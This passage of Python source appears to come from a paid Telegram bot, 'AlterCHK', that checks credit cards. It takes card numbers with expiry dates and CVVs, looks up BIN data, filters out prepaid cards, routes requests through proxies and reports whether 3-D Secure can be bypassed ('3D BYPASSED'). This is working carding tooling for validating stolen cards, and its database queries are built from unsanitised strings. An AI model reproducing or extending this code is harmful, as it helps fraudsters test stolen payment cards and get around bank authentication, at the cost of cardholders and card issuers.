            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBin Not Found!\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if ((brand == 'VISA') or (brand == 'MASTERCARD') or (brand == 'DISCOVER') or (brand == 'AMERICAN EXPRESS')) == False :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{brand} {emoji}</code>\nComment ↯ <code>This bot only accepts American, Visa, Mastercard and Discover.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    rbin = await ConnectDB.run_query(f"SELECT * FROM binbanned WHERE Bin='{CcVerify[0:6]}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (len(rbin) != 0) or (int(level.find('PREPAID')) >= 0) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ Bin banned for this bot. ↯\n- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{level} {emoji}</code>\nComment ↯ <code>All Prepaid Banned.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        fin = f'{time.time()-inicio}'
        message_send = await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ CHECKING CARD 🔴 ] ↯\n- - - - - - - - - - - - - - - - - - - - -\n{TwoNameGateway}\nCC ↯ <code>{CcVerify}</code>\nTime ↯ {fin[0:4]}s\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    UserStatus = json.loads(json.dumps(result[0]))['Status']

    if not message.from_user.username : UserName = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    else : UserName = f'@{message.from_user.username}'
    if CcVerify:
        CheckedP = await CheckProxy()
        try :
            if not CheckedP :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>[ An unexpected error occurred. Proxy Error. ⚠️ ]</b>\nResult - ↯ <b>Please try again.\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        from CMDvbv import VBV
        CheckRecive = await VBV(CcVerify, CheckedP[1])
        if (CheckRecive == 'Lookup Not Enrolled') or (int(CheckRecive.find('Successful')) >= 0) :
            Status = '[ 3D BYPASSED ✅ ]'
        elif int(CheckRecive.find('An unexpected error occurred')) >= 0 :
            Status = f'[ {CheckRecive} ]'
            CheckRecive = f'Please try again.'
        else :
            Status = '[ NO BYPASSED ❌ ]'
        fin = f'{time.time()-inicio}'
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        try :
            await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nResult - ↯ <b>{CheckRecive}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#

@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["br"])
async def CMDsb(message: types.Message):
    NameGateway = 'Gateway 🔥 Zarek [ Auth ]'
    TwoNameGateway = 'Gateway ↯ Zarek [ Auth ]'
    ThreeGateway = 'Gateway 🔥 Zarek [↯]'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('br')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (await VerifyBanned(f'{message.from_user.id}')) == 'Yes' :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are banned from this bot.\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if int(len(re.sub("[^0-9]", "", message.text)))>=15:
        VerMessage = message.text
    elif message.reply_to_message:
            VerMessage = message.reply_to_message.text
    else :
        VerMessage = message.text

    if not re.sub("[^0-9]", "", VerMessage) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    CcVerify = await CCheck(re.sub("[^0-9]", " ", VerMessage))
    if not CcVerify:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{CcVerify[0:6]}'")
        result = json.loads(json.dumps(result[0]))
        type = result['type']
        level = result['level']
        brand = result['brand']
        bank = result['bank']
        country = result['country']
        emoji = result['Emoji']
    except IndexError :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBin Not Found!\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return